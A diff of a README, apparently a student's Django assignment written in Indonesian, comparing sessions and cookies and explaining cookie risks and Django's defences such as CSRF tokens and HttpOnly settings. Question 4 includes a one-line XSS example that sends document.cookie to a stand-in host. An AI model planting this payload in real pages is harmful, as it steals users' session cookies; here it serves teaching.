@@ -255,7 +255,88 @@ Sedangkan Otorisasi adalah proses untuk menentukan dan memberikan hak akses kepa
 
 ---
 
-## 3. Apa saja kelebihan dan kekurangan session dan cookies dalam konteks menyimpan state di aplikasi web?
-### Cookies
+## 3. Apa saja kelebihan dan kekurangan _session_ dan _cookies_ dalam konteks menyimpan state di aplikasi web?
+
+### _Session_
+
 Kelebihan:
-- 
+
+- Lebih aman karena data disimpan di dalam server langsung.
+- Bisa menyimpan data lebih besar dibandingkan dengan _cookies_ yang hanya bisa maksimal menyimpan 4kb.
+- Server memiliki kontrol penuh karena bisa menghapus atau mengubah session kapan saja.
+
+Kekurangan:
+
+- Membutuhkan storage server lebih besar, terutama kalau jumlah pengguna banyak
+- Data bertahan hanya sementara, kalau user logout, biasanya data akan dihapus.
+
+### _Cookies_
+
+Kelebihan:
+
+- Persistent dimana data bisa bertahan lebih lama
+- Mudah diakses di client side.
+- Lebih ringan dibanding _Session_.
+
+Kekurangan:
+
+- Size terbatas, hanya sekitar 4kb
+- Data lebih mudah dicuri dan rencan XSS
+- Data dikirim setiap request yang mana bisa membuat beban server sedikit naik
+
+| Aspek                  | Cookies                     | Session                                        |
+| ---------------------- | --------------------------- | ---------------------------------------------- |
+| **Tempat penyimpanan** | Client (browser)            | Server                                         |
+| **Keamanan**           | Rentan dimanipulasi/XSS     | Lebih aman, data tidak di client               |
+| **Ukuran data**        | Terbatas, hanya sekitar 4kb | Bisa besar, tergantung server dan jumlah beban |
+| **Persistensi**        | Bisa bertahan lama          | Biasanya sementara, bisa dihapus saat logout   |
+| **Overhead network**   | Dikirim tiap request        | Hanya ID dikirim, data tetap di server         |
+
+---
+
+## 4. Apakah penggunaan _cookies_ aman secara _default_ dalam pengembangan web, atau apakah ada risiko potensial yang harus diwaspadai? Bagaimana Django menangani hal tersebut?
+
+Secara _default_, penggunaan _cookies_ tidaklah aman dalam pengembangan web karena cookies disimpan di dalam web browser milik _client_. Ada beberapa risiko umum yang biasanya terjadi di dalam penggunaan cookies seperti:
+
+- Pencurian _cookie_, biasanya dilakukan dengan xss. Contoh sederhananya seperti berikut
+  ```html
+  <script>
+    fetch("https://example.com/?cookie=" + document.cookie);
+  </script>
+  ```
+- Manipulasi _cookie_, dimana _cookie_ bisa diedit oleh user di sisi _client_, misal mengubah preferensi atau level akses jika server tidak memvalidasi dengan benar.
+- Cross-Site Request Forgery (CSRF), dimana _cookies_ otomatis dikirim ke domain asal, sehingga bisa disalahgunakan untuk melakukan aksi atas nama user tanpa sepengetahuan mereka.
+
+### Bagaimana django menangani cookies
+
+- Django menyediakan CSRF middleware, yang menggunakan token untuk mencegah request palsu yang menggunakan cookie login. contoh sederhana penggunaannya seperti
+  ```html
+  <form method="POST">
+    {% csrf_token %}
+    <!-- isi form lainnya -->
+  </form>
+  ```
+- Django memiliki fitur [signed cookies](https://docs.djangoproject.com/en/5.2/topics/signing/) dimana data di cookie tidak bisa diubah sembarangan oleh client tanpa terdeteksi.
+- Django memiliki fitur session ID di cookie secara default, sementara data disimpan di session disimpan di dalam server. Secara default memiliki settingan sebagai berikut
+    ```python
+    SESSION_COOKIE_HTTPONLY = True # cookie tidak bisa diakses JS, sumber: https://docs.djangoproject.com/en/5.2/ref/settings/#std-setting-SESSION_COOKIE_HTTPONLY
+    SESSION_COOKIE_SECURE = False # bisa diaktifkan untuk HTTPS, sumber: https://docs.djangoproject.com/en/5.2/ref/settings/#session-cookie-secure
+    SESSION_COOKIE_SAMESITE = 'Lax' # membantu mencegah CSRF, sumber: https://docs.djangoproject.com/en/5.2/ref/settings/#session-cookie-samesite
+
+    ```
+
+
+---
+
+## 5. Jelaskan bagaimana cara kamu mengimplementasikan *checklist* di atas secara *step-by-step* (bukan hanya sekadar mengikuti tutorial).
+
+Selain mengikuti tutorial, saya juga bereksperimen dengan beberapa hal tambahan. Saya membaca [dokumentasi resmi](https://docs.djangoproject.com/en/5.2/topics/auth/default/), tutorial eksternal seperti [w3school](https://www.w3schools.com/django/), dan juga sesekali bertanya ke LLM untuk debugging error.
+
+Langkah yang saya lakukan secara garis besar adalah:
+
+1. Membuat views baru.
+2. Mengubah sedikit model database nya.
+3. Membuat `forms.py` berupa AuthenticationForm agar saya bisa melakukan kustomisasi pada styling nya dan.
+4. Membuat file html baru dan mengisinya.
+5. Lalu menambahkan sedikit styling untuk mempercantik di forms.py
+6. Lalu menambahkan page baru untuk melihat profile dan data cookies seperti last login
